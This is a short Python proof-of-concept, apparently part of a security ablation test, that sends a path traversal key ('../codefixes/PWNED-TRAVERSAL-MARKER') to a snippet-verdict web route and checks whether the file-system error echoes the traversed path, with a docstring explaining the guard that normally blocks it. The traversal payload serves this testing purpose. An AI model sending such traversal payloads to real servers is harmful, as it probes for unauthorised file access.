"""Path building from req.body.key in routes/vulnCodeSnippet.ts (checkVulnLines).

The .info.yml path is built from key, but retrieveCodeSnippet(key) must match a
known challenge first (snippetData == null -> 404), so a traversal key is
rejected before the fs access (guard). Ablation stubs retrieveCodeSnippet to
return a value for any key: a traversal key then reaches fs.stat, which throws
ENOENT echoing the attacker-controlled traversed path (proof the sink received
it); without the ablation the request is a plain 404 with no fs access.
"""

import json
import urllib.error
import urllib.request

KEY = "../codefixes/PWNED-TRAVERSAL-MARKER"


def _post(base: str):
    body = json.dumps({"key": KEY, "selectedLines": [1]}).encode()
    req = urllib.request.Request(f"{base}/snippets/verdict", data=body,
                                 headers={"content-type": "application/json"})
    try:
        with urllib.request.urlopen(req) as res:
            return res.status, res.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as err:
        return err.code, err.read().decode("utf-8", "replace")


def exploit(base: str) -> tuple[bool, str]:
    status, body = _post(base)
    # fs.stat received the traversed path only if the error echoes it with the suffix.
    reached = "PWNED-TRAVERSAL-MARKER.info.yml" in body
    return reached, f"HTTP {status}, traversed path in fs error: {reached}"
